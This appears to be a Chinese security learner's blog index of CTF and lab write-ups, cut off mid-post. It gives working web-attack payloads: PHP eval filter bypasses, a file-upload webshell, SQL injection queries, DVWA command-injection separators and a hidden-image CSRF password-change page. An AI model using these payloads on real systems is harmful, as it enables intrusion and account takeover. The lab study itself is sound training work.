{"meta":{"title":"無与倫比","subtitle":"菜鸟成长记","description":"静者心多妙，飘然思不群","author":"alun","url":"http://alunxzhou.github.io","root":"/"},"pages":[{"title":"关于笔者","date":"2020-09-14T07:30:30.000Z","updated":"2023-01-08T23:46:23.920Z","comments":true,"path":"about/index.html","permalink":"http://alunxzhou.github.io/about/index.html","excerpt":"","text":""},{"title":"留言板","date":"2023-01-08T14:28:46.000Z","updated":"2023-01-08T23:44:40.706Z","comments":true,"path":"comment/index.html","permalink":"http://alunxzhou.github.io/comment/index.html","excerpt":"","text":""},{"title":"心之所向","date":"2022-10-02T02:26:50.000Z","updated":"2023-01-07T04:50:43.541Z","comments":true,"path":"categories/index.html","permalink":"http://alunxzhou.github.io/categories/index.html","excerpt":"","text":""},{"title":"图墙","date":"2023-01-08T14:27:59.000Z","updated":"2023-01-08T23:45:51.184Z","comments":true,"path":"photos/index.html","permalink":"http://alunxzhou.github.io/photos/index.html","excerpt":"","text":""},{"title":"影视","date":"2023-01-08T14:28:28.000Z","updated":"2023-01-08T23:45:06.338Z","comments":true,"path":"movies/index.html","permalink":"http://alunxzhou.github.io/movies/index.html","excerpt":"","text":""},{"title":"音乐","date":"2023-01-08T14:28:14.000Z","updated":"2023-01-08T23:45:19.622Z","comments":true,"path":"music/index.html","permalink":"http://alunxzhou.github.io/music/index.html","excerpt":"","text":""},{"title":"友链","date":"2023-01-08T14:27:16.000Z","updated":"2023-01-08T23:44:54.556Z","comments":true,"path":"links/index.html","permalink":"http://alunxzhou.github.io/links/index.html","excerpt":"","text":""},{"title":"分享","date":"2023-01-08T14:27:42.000Z","updated":"2023-01-08T23:46:11.287Z","comments":true,"path":"shuoshuo/index.html","permalink":"http://alunxzhou.github.io/shuoshuo/index.html","excerpt":"","text":""},{"title":"万众瞩目","date":"2022-10-02T02:27:06.000Z","updated":"2023-01-07T04:50:42.880Z","comments":true,"path":"tags/index.html","permalink":"http://alunxzhou.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"命令执行绕过总结","slug":"命令执行绕过总结","date":"2023-01-07T09:37:07.000Z","updated":"2023-01-07T09:37:41.575Z","comments":true,"path":"2023/01/07/命令执行绕过总结/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/","excerpt":"命令执行绕过总结_半只特立独行的猪的博客-CSDN博客_命令执行绕过 php函数操作：scandir(’.’):扫描当前目录localeconv() 函数返回一数组。而数组第一项就是.(用来绕过.过滤)pos(),current():返回数组第一个值print_r(scandir(‘.’)); 查看当前目录下的所有文件名","text":"命令执行绕过总结_半只特立独行的猪的博客-CSDN博客_命令执行绕过 php函数操作：scandir(’.’):扫描当前目录localeconv() 函数返回一数组。而数组第一项就是.(用来绕过.过滤)pos(),current():返回数组第一个值print_r(scandir(‘.’)); 查看当前目录下的所有文件名 数组操作函数：end():数组指针指向最后一位next() 将数组中的内部指针向前移动一位prev() 将数组中的内部指针倒回一位array_reverse(): 将数组颠倒array_rand(): 随机返回数组的键名array_flip()：交换数组的键和值 读取文件函数file_get_content() :因为et被ban，所以不能使用readfile()highlight_file()show_source() 另解：c=print_r(scandir(pos(localeconv()))); 查看当前目录所有文件 c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 读取当前目录倒数第二个文件，得出flag","categories":[{"name":"命令执行","slug":"命令执行","permalink":"http://alunxzhou.github.io/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(文件上传+命令执行)BUU UPLOAD COURSE","slug":"文件上传-命令执行-BUU-UPLOAD-COURSE","date":"2023-01-07T09:35:35.000Z","updated":"2023-01-07T09:36:43.540Z","comments":true,"path":"2023/01/07/文件上传-命令执行-BUU-UPLOAD-COURSE/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/","excerpt":"","text":"这一题没有过滤，但是上传的文件都会被改成jpg 所以.htaccess在这里也用不了 我们发现，虽然文件重命名了，但是还是可以执行php代码，于是上传一句话木马，然后蚁剑链接即可 是我们还可以用命令执行 先传一个一句话木马 在url中的file后面添加文件路径 最后getshell","categories":[{"name":"命令执行","slug":"命令执行","permalink":"http://alunxzhou.github.io/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"ctfshow web32 对分号、括号的绕过","slug":"ctfshow-web32-对分号、括号的绕过","date":"2023-01-07T09:33:49.000Z","updated":"2023-01-07T09:34:48.756Z","comments":true,"path":"2023/01/07/ctfshow-web32-对分号、括号的绕过/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/ctfshow-web32-%E5%AF%B9%E5%88%86%E5%8F%B7%E3%80%81%E6%8B%AC%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87/","excerpt":"&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:56:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125;","text":"&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:56:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 过滤了 flag system php cat sort shell . space ’ ` echo ; ( 过滤了空格可以用${IFS}和%0a 代替，分号可以用?&gt;代替但是过滤了括号之后就不能用带有括号的函数，php中include是可以不带括号的函数，和web31一样，这里需要用文件包含 php伪协议通常用于文件包含中，php中文件包含的函数有很多，比如 include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile c=include$_GET[“1”]?&gt; &amp;1=php://filter/read=convert.base64-encode/resource=flag.php 也可以data伪协议","categories":[{"name":"命令执行","slug":"命令执行","permalink":"http://alunxzhou.github.io/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(图片分离+brainfuck编码+Ook！编码)记一道BUUCTF misc中的一题","slug":"图片分离-brainfuck编码-Ook！编码-记一道BUUCTF-misc中的一题","date":"2023-01-07T09:29:53.000Z","updated":"2023-01-07T09:33:03.877Z","comments":true,"path":"2023/01/07/图片分离-brainfuck编码-Ook！编码-记一道BUUCTF-misc中的一题/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/","excerpt":"","text":"打开压缩包有一张图片 题目名字是面具下的flag，我想了一下，戴面具估计就是为了隐藏，所以猜测这个图片隐藏了其他文件 winhex打开一探究竟 结尾处的50 4B 01 02 是zip压缩包的开头 用binwalk查看有几个文件 foremost分离文件 这里output有之前分离的文件。我们先将他们删除 用rm -r +路径 删除 之后再来分离 此时output文件夹中多了三个文件 文件只能在终端打开 00000934.zip就是分离出的压缩包 用unzip命令将其解压 得到flag.vmdk文件 我们再将其解压 7z x flag.vmdk -o./ 然后得到以下几个文件 用tree命令查看 一个一个文件查看后发现flag分为两块 第一块为brainfuck编码，第二块为Ook！编码 https://www.splitbrain.org/services/ook（解密网址） 拿到flag——–flag{N7F5_AD5_i5_funny!} 这一题比较经典，记录一下。","categories":[{"name":"图片分离术","slug":"图片分离术","permalink":"http://alunxzhou.github.io/categories/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB%E6%9C%AF/"}],"tags":[{"name":"MISC","slug":"MISC","permalink":"http://alunxzhou.github.io/tags/MISC/"}]},{"title":"(图片拼接)NewStarCTF 公开赛赛道week2 MISC Coldwinds's Desktop(复现)","slug":"图片拼接-NewStarCTF-公开赛赛道week2-MISC-Coldwinds-s-Desktop-复现","date":"2023-01-07T09:27:24.000Z","updated":"2023-01-07T09:29:31.610Z","comments":true,"path":"2023/01/07/图片拼接-NewStarCTF-公开赛赛道week2-MISC-Coldwinds-s-Desktop-复现/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"这是一道拼图题目学要用到的工具有ImageMagick 和kali中的gaps montage命令使用方法 在图片目录cmd输入命令magick montage *.png -tile 16x9 -geometry +0+0 flag.jpg -geometry +0+0 这个命令是使整合图片间隙为0 得到整合图片 在kali中使用命令gaps --image=flag.jpg --size=30 --population=144 --generations=64 --save –image 指向拼图的路径 –size 拼图块的像素尺寸 –generations 遗传算法的代的数量 –population 个体数量 –verbose 每一代训练结束后展示最佳结果 –save 将拼图还原为图像 size比较重要，这里影响着图片数量，图片数量要和本来的图片数相等 原文链接：https://blog.csdn.net/m0_47643893/article/details/113778577 得到拼图 最后ps得到","categories":[{"name":"图片隐写","slug":"图片隐写","permalink":"http://alunxzhou.github.io/categories/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"}],"tags":[{"name":"MISC","slug":"MISC","permalink":"http://alunxzhou.github.io/tags/MISC/"}]},{"title":"mp3stego怎么用","slug":"mp3stego怎么用","date":"2023-01-07T09:26:38.000Z","updated":"2023-01-07T09:27:05.783Z","comments":true,"path":"2023/01/07/mp3stego怎么用/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/mp3stego%E6%80%8E%E4%B9%88%E7%94%A8/","excerpt":"首先先下载压缩包并解压到所需位置，打开文件夹找到名为Decode.exe和Encode.exe的文件，在地址栏复制文件位置。","text":"首先先下载压缩包并解压到所需位置，打开文件夹找到名为Decode.exe和Encode.exe的文件，在地址栏复制文件位置。 win+R输入cmd打开命令行，将复制的路径粘贴到命令行下，记得在前面加cd（及进入该路径），回车后进入文件夹。 使用decode解密 将需要解密的MP3文件复制至装有decode文件的目录下，在命令行中输入 Decode.exe -X -P 密码 MP3文件名 （-X 获取隐藏文件 -P密码） 回车后等待，最后在文件夹中得到隐藏的文件 使用encode加密 同样的，将wav音频文件（我试了一下好像只能加密wav）和需要的txt文件复制到目录下，在打开的命令行中输入 encode -E 加密的txt文件 -P 密码 加密的wav文件 输出的MP3文件名 原文链接：https://blog.csdn.net/qq_63575829/article/details/123770436","categories":[{"name":"ctf工具","slug":"ctf工具","permalink":"http://alunxzhou.github.io/categories/ctf%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://alunxzhou.github.io/tags/ctf/"}]},{"title":"gaps安装","slug":"gaps安装","date":"2023-01-07T09:24:36.000Z","updated":"2023-01-07T09:25:35.810Z","comments":true,"path":"2023/01/07/gaps安装/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/gaps%E5%AE%89%E8%A3%85/","excerpt":"看了很多教程最后花了几个小时装了下来，记录一下。","text":"看了很多教程最后花了几个小时装了下来，记录一下。 下载命令 git clone https://github.com/nemanja-m/gaps.git #gaps官网 cd gaps pip install -r requirements.txt sudo apt-get install python-tk pip install -e . 我的kali进不了github所以我在windows下将gaps包挪到了kali中。 命令行中输入gaps即可在kali中下载。 下载后使用命令 sudo apt-get install python3-pillow sudo apt-get install python3-numpy sudo apt-get install python3-opencv-python sudo apt-get install python3-pytest sudo apt-get install python3-matplotlib 然后查看requirements.txt 对应的各自版本号，不同则修改 括号内的就是版本号 最后使用命令pip3 install -e . 出现以上内容安装成功。","categories":[{"name":"ctf工具","slug":"ctf工具","permalink":"http://alunxzhou.github.io/categories/ctf%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://alunxzhou.github.io/tags/ctf/"}]},{"title":"outguess图片隐写工具安装使用","slug":"outguess图片隐写工具安装使用","date":"2023-01-07T09:22:17.000Z","updated":"2023-01-07T09:24:07.226Z","comments":true,"path":"2023/01/07/outguess图片隐写工具安装使用/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/outguess%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/","excerpt":"outguess下载安装 kail 终端命令输入git clone https://github.com/crorvick/outguess，安装包下载完成到文件夹。打开文件夹，右键空白处选终端打开，输入命令./configure &amp;&amp; make &amp;&amp; make install进行安装。","text":"outguess下载安装 kail 终端命令输入git clone https://github.com/crorvick/outguess，安装包下载完成到文件夹。打开文件夹，右键空白处选终端打开，输入命令./configure &amp;&amp; make &amp;&amp; make install进行安装。 使用outguess 输入outguess -help即可获得相关命令。 加密： outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg 加密之后，demo.jpg会覆盖out.jpg，hidden.txt的内容是要隐藏的东西。 解密： outguess -k “my secret key” -r out.jpg hidden.txt 解密之后，紧密内容放在hidden.txt中","categories":[{"name":"ctf工具","slug":"ctf工具","permalink":"http://alunxzhou.github.io/categories/ctf%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://alunxzhou.github.io/tags/ctf/"}]},{"title":"Sqlilab靶场","slug":"Sqlilab靶场","date":"2023-01-07T09:18:14.000Z","updated":"2023-01-07T09:21:26.224Z","comments":true,"path":"2023/01/07/Sqlilab靶场/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入) ?id=1’ 报错 加了注释符之后不报错，说明是字符型注入 order by 猜字段 union select 爆出错误所在位置 查看数据库和版本信息 爆表名 爆列名 爆数据 0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ‘:’ ，用以分割pasword和username。 Less-2 GET - Error based - Intiger based (基于错误的GET整型注入) id=1 and 1=1 不报错，可知整形注入 其余步骤与第一关一样，不加’与注释符号 Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入) 报错数字1的后面多了），可疑 所以是‘）绕过 后续步骤与第一关一样 Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入） 这都不报错，有点顽固 看到一个），可疑 其余步骤和第一关一样 对前四关总结前四关都是再id=1的基础上加一个或两个符号，可以根据报错来判断需要用什么符号来绕过。 以此为例，报错语句中 ‘’1’’)LIMIT0,1’ 简要分析，除掉两端的单引号 则为 ‘1’’)LIMIT0,1 ，可以看出1的右边多了’)，我们输入的为?id=1’ 所以可以分解为 ‘1’ ‘) LIMIT0,1 ,中间的‘是sql语句中本身就带着的，被我们前面加上的’给挤到后面了，所以sql中还多了一个），这一个）就是为了闭合（ 1为我们加的闭合字符，2为sql语句中的原有字符 所以判断为’)闭合 Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)sql盲注知识点left(database(),1)&gt;’s’ //left()函数 Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位 ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ //substr()函数，ascii()函数 Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换 为 ascii 值 ▲ascii(substr((select database()),1,1))=98 ▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数，MID()函数 Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值 left(version(),1)=5 查看version()第一位是不是5 length(database())=8 查看database()是否为8位 left(database(),8)=’security’ 查看数据库是否为security ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 此处 table_schema 可以写成 =’security’，但是我们这里使用的 database()，是因为此处 database()就是 security。此处同样的使用二分法进行测试，直到测试正确为止。此处应该是 101，因为第一个表示 email。 substr(a,b,c)从b位置开始，截取a的c位 limit 0,1表示的是从第一条记录开始，只取一条即可 limit 5,10表示的是从第五条记录开始，取十条记录，取到第16条记录 第五关第六关操作差不多 剩下的不写了，都差不多 https://blog.csdn.net/hxhxhxhxx/article/details/107643024 https://www.cnblogs.com/-qing-/p/11610385.html#_label0","categories":[{"name":"sql注入","slug":"sql注入","permalink":"http://alunxzhou.github.io/categories/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"http://alunxzhou.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"DVWA靶场（待补充）","slug":"DVWA靶场（待补充）","date":"2023-01-07T09:11:03.000Z","updated":"2023-01-07T09:17:37.617Z","comments":true,"path":"2023/01/07/DVWA靶场（待补充）/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/","excerpt":"Command Injection(命令执行)127.0.0.1 &amp; ipconfig 先执行127.0.0.1，不管127.0.0.1是否执行成功都会执行ipconfig127.0.0.1 &amp;&amp; ipconfig 先执行127.0.0.1，127.0.0.1执行成功后才会执行ipconfig127.0.0.1 | ipconfig 不管127.0.0.1执行是否成功都会执行ipconfig127.0.0 || ipconfig 前面的命令要执行失败，才可以执行后面的命令执行 ping 127.0.0.1 ; ipconfig Linux下分隔符","text":"Command Injection(命令执行)127.0.0.1 &amp; ipconfig 先执行127.0.0.1，不管127.0.0.1是否执行成功都会执行ipconfig127.0.0.1 &amp;&amp; ipconfig 先执行127.0.0.1，127.0.0.1执行成功后才会执行ipconfig127.0.0.1 | ipconfig 不管127.0.0.1执行是否成功都会执行ipconfig127.0.0 || ipconfig 前面的命令要执行失败，才可以执行后面的命令执行 ping 127.0.0.1 ; ipconfig Linux下分隔符 LOW源码解析&lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ];// 确定操作系统并执行ping命令if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target );&#125;else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target );&#125;// Feedback for the end userecho &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125; 其中ping -c 4 是在linux中的命令 解决方法通过代码可以发现，服务器仅仅只是判断了不同的操作系统执行不同的命令，并没有做其他的限制 Medium源码解析&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Set blacklist//设置命令黑名单，里面包含&amp;&amp;和； $substitutions = array( &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist).//将参数中有&amp;&amp;和；的都替换成空 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 解决方法由于过滤了&amp;&amp;与； 所以我们还能使用&amp;、|、 || 127.0.0.1&amp;ipconfig127.0.0.1|ipconfig127.0.0||ipconfig HIGH源码解析&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist//设置命令黑名单，里面包含&amp; ；| - $ ( ) \\ &#x27; || $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist).//替换成空 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 解决方法​ 看到代码，发现黑名单中的限制更多了，像 ‘&amp;’，’| ‘，’||’，’;’，’$’ 等许多都加了限制，但是要仔细观察 ，比如说这个 ‘| ‘ ，它是在管道符后面加了个空格，因此考虑使用 127.0.0.1 |ipconfig 来绕过 Impossible源码解析&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // stripslashes函数会剥离字符串中的反斜杠，然后返回剥离完反斜杠的字符串 $target = stripslashes( $target ); // Split the IP into 4 octects，以.作为分隔符，分割$target $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer，检测分割后的元素是否都是数字类型 if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&#x27;s put the IP back together.如过都是数字类型的话，就将2他们再合并成$torget $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 防御思路​ 设置黑名单过滤特殊符号​ 替换、转义关键字​ 设置白名单，限制传参 CSRF(跨站请求伪造)CSRF（跨站请求伪造），全称为Cross-site request forgery，简单来说，是攻击者利用受害者尚未失效的身份认证信息，诱骗受害者点击恶意链接或含有攻击代码的页面，在受害者不知情的情况下以受害者的身份向服务器发起请求，从而实现非法攻击（改密）。 LOW源码解析&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Get input//获取两个输入框的密码 $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match?//查看两次输入的是否一致 if( $pass_new == $pass_conf ) &#123; // They do!//如果一致就直接插入数据库 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 解决方法通过GET方式获取两次密码，两次密码输入一致的话，就可以直接带入数据中修改密码。 首先尝试修改为123456 然后测试修改后的密码 发现修改成功 同时发现URL显示了我们输入要修改的密码 在WWW目录下新建一个1.html，写入 &lt;img src=&quot;http://127.0.0.1/DVWA-master/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; 如此，当我们打开1.html时，密码就会被修改为123456（诱骗打开这个1.html） Medium源码解析&lt;?php if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Checks to see where the request came from//stripos(str1, str2)检查str2在str1中出现的位置（不区分大小写)，如果有返//回True，反之False//判断Host字段是否出现在referer字段中 if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Didn&#x27;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125; ?&gt; 解决方法加上了对用户请求头的中的Referer字段进行验证 即用户的请求头中的Referer字段必须包含了服务器的名字 if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) 所以就不能其他网页通过点开链接修改密码 需要伪造 referer 先正常访问dvwa 再抓包获取 referfer 先抓包 可以看到有Referer头 再构造url：http://192.168.1.15:8080/dvwa/vulnerabilities/csrf/?password_new=12345678&amp;password_conf=12345678&amp;Change=Change#抓包访问 构造referer头 Referer:http://192.168.1.15:8080/dvwa/vulnerabilities/csrf/?. 放包即可 High还不是很理解原理 源码解析&lt;?php if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Check Anti-CSRF token//可以看到加入了token机制 checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( 